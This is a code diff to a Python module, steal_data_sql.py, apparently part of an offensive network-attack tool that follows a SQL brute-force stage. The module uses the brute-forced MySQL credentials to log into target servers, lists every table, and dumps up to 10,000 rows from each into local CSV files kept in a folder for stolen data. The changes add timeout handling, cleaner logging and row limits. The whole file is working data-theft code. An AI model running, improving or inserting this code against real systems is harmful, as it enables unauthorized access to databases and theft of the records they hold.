@@ -3,12 +3,12 @@ import csv
 import logging
 import time
 import pymysql
-from threading import Timer
 from shared import SharedData
 from logger import Logger
+from timeout_utils import TimeoutContext
 
 # Configure the logger
-logger = Logger(name="steal_data_sql.py", level=logging.DEBUG)
+logger = Logger(name="steal_data_sql.py", level=logging.INFO)
 
 # Define the necessary global variables
 b_class = "StealDataSQL"
@@ -26,13 +26,14 @@ class StealDataSQL:
             self.shared_data = shared_data
             self.sql_connected = False
             self.stop_execution = False
+            self.b_parent_action = "brute_force_sql"  # Parent action status key
             logger.info("StealDataSQL initialized.")
         except Exception as e:
             logger.error(f"Error during initialization: {e}")
 
     def connect_sql(self, ip, username, password, database=None):
         """
-        Establish a MySQL connection using pymysql.
+        Establish a MySQL connection using pymysql with 30 second timeouts.
         """
         try:
             conn = pymysql.connect(
@@ -41,7 +42,9 @@ class StealDataSQL:
                 password=password,
                 database=database,
                 port=3306,
-                connect_timeout=10
+                connect_timeout=30,
+                read_timeout=30,
+                write_timeout=30
             )
             self.sql_connected = True
             logger.info(f"Connected to {ip} via SQL with username {username}" + (f" to database {database}" if database else ""))
@@ -78,12 +81,14 @@ class StealDataSQL:
     def steal_data(self, conn, table, schema, local_dir):
         """
         Download data from the table in the database to a local file.
+        Uses LIMIT clause to prevent fetching huge tables.
         """
         try:
-            if self.shared_data.orchestrator_should_exit:
+            if self.shared_data.orchestrator_should_exit or self.stop_execution:
                 logger.info("Data stealing process interrupted due to orchestrator exit.")
                 return
-            query = f"SELECT * FROM {schema}.{table}"
+            # Use LIMIT to prevent memory issues with large tables
+            query = f"SELECT * FROM {schema}.{table} LIMIT 10000"
             with conn.cursor() as cursor:
                 cursor.execute(query)
                 rows = cursor.fetchall()
@@ -94,7 +99,7 @@ class StealDataSQL:
                 writer = csv.writer(f)
                 writer.writerow(columns)
                 writer.writerows(rows)
-            logger.success(f"Downloaded data from table {schema}.{table} to {local_file_path}")
+            logger.success(f"Downloaded {schema}.{table} ({len(rows)} rows)")
         except Exception as e:
             logger.error(f"Error downloading data from table {schema}.{table}: {e}")
 
@@ -102,10 +107,11 @@ class StealDataSQL:
         """
         Steal data from the remote SQL server.
         """
+        start_time = time.time()
+        logger.lifecycle_start("StealDataSQL", ip, port)
         try:
             if 'success' in row.get(self.b_parent_action, ''):
                 self.shared_data.bjornorch_status = "StealDataSQL"
-                time.sleep(5)
                 logger.info(f"Stealing data from {ip}:{port}...")
 
                 sqlfile = self.shared_data.sqlfile
@@ -124,71 +130,75 @@ class StealDataSQL:
 
                 if not credentials:
                     logger.error(f"No valid credentials found for {ip}. Skipping...")
+                    duration = time.time() - start_time
+                    logger.lifecycle_end("StealDataSQL", 'failed', duration, ip)
                     return 'failed'
 
-                def timeout():
+                def handle_timeout():
                     if not self.sql_connected:
-                        logger.error(f"No SQL connection established within 4 minutes for {ip}. Marking as failed.")
+                        logger.lifecycle_timeout("StealDataSQL", "SQL connection", 240, ip)
                         self.stop_execution = True
 
-                timer = Timer(240, timeout)
-                timer.start()
+                # Use TimeoutContext instead of Timer(240)
+                with TimeoutContext(timeout=240, on_timeout=handle_timeout) as timeout_ctx:
+                    success = False
+                    for username, password, database in credentials:
+                        if timeout_ctx.should_stop or self.stop_execution or self.shared_data.orchestrator_should_exit:
+                            logger.info("Steal data execution interrupted.")
+                            break
+                        try:
+                            logger.debug(f"Trying {username} for {ip} db:{database}")
+                            # First connect without database to check global permissions
+                            conn = self.connect_sql(ip, username, password)
+                            if conn:
+                                tables = self.find_tables(conn)
+                                mac = row['MAC Address']
+                                local_dir = os.path.join(self.shared_data.datastolendir, f"sql/{mac}_{ip}/{database}")
+                                os.makedirs(local_dir, exist_ok=True)
 
-                success = False
-                for username, password, database in credentials:
-                    if self.stop_execution or self.shared_data.orchestrator_should_exit:
-                        logger.info("Steal data execution interrupted.")
-                        break
-                    try:
-                        logger.info(f"Trying credential {username}:{password} for {ip} on database {database}")
-                        # First connect without database to check global permissions
-                        conn = self.connect_sql(ip, username, password)
-                        if conn:
-                            tables = self.find_tables(conn)
-                            mac = row['MAC Address']
-                            local_dir = os.path.join(self.shared_data.datastolendir, f"sql/{mac}_{ip}/{database}")
-                            os.makedirs(local_dir, exist_ok=True)
+                                if tables:
+                                    for table, schema in tables:
+                                        if timeout_ctx.should_stop or self.stop_execution or self.shared_data.orchestrator_should_exit:
+                                            break
+                                        # Connect to specific database for data theft
+                                        db_conn = self.connect_sql(ip, username, password, schema)
+                                        if db_conn:
+                                            self.steal_data(db_conn, table, schema, local_dir)
+                                            db_conn.close()
+                                    success = True
+                                    counttables = len(tables)
+                                    logger.success(f"Successfully stolen data from {counttables} tables on {ip}:{port}")
 
-                            if tables:
-                                for table, schema in tables:
-                                    if self.stop_execution or self.shared_data.orchestrator_should_exit:
-                                        break
-                                    # Connect to specific database for data theft
-                                    db_conn = self.connect_sql(ip, username, password, schema)
-                                    if db_conn:
-                                        self.steal_data(db_conn, table, schema, local_dir)
-                                        db_conn.close()
-                                success = True
-                                counttables = len(tables)
-                                logger.success(f"Successfully stolen data from {counttables} tables on {ip}:{port}")
+                                conn.close()
 
-                            conn.close()
-
-                            if success:
-                                timer.cancel()
-                                return 'success'
-                    except Exception as e:
-                        logger.error(f"Error stealing data from {ip} with user '{username}' on database {database}: {e}")
+                                if success:
+                                    duration = time.time() - start_time
+                                    logger.lifecycle_end("StealDataSQL", 'success', duration, ip)
+                                    return 'success'
+                        except Exception as e:
+                            logger.error(f"Error stealing data from {ip} with user '{username}' on database {database}: {e}")
 
                 if not success:
                     logger.error(f"Failed to steal any data from {ip}:{port}")
+                    duration = time.time() - start_time
+                    logger.lifecycle_end("StealDataSQL", 'failed', duration, ip)
                     return 'failed'
                 else:
+                    duration = time.time() - start_time
+                    logger.lifecycle_end("StealDataSQL", 'success', duration, ip)
                     return 'success'
 
             else:
                 logger.info(f"Skipping {ip} as it was not successfully bruteforced")
+                duration = time.time() - start_time
+                logger.lifecycle_end("StealDataSQL", 'skipped', duration, ip)
                 return 'skipped'
 
         except Exception as e:
             logger.error(f"Unexpected error during execution for {ip}:{port}: {e}")
+            duration = time.time() - start_time
+            logger.lifecycle_end("StealDataSQL", 'failed', duration, ip)
             return 'failed'
-
-    def b_parent_action(self, row):
-        """
-        Get the parent action status from the row.
-        """
-        return row.get(b_parent, {}).get(b_status, '')
 
 if __name__ == "__main__":
     shared_data = SharedData()
